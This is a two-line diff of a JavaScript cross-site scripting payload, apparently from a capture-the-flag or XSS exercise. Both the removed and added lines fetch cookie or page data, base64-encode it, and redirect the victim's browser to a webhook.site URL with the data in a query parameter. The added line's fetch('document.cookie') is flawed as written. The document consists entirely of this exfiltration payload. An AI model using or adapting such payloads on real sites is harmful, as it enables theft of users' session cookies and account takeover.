@@ -1,2 +1,2 @@
 
-fetch('/cookies.php').then(response => response.text()).then(text => window.location.href =`https://webhook.site/95b7f1e1-b976-493b-8573-7d236067214f?cz=${btoa(text)}`);
+fetch('document.cookie').then(response => response.text()).then(text => window.location.href =`https://webhook.site/76545f8b-3667-4b31-9346-0f05f721869f?cz=${btoa(text)}`);
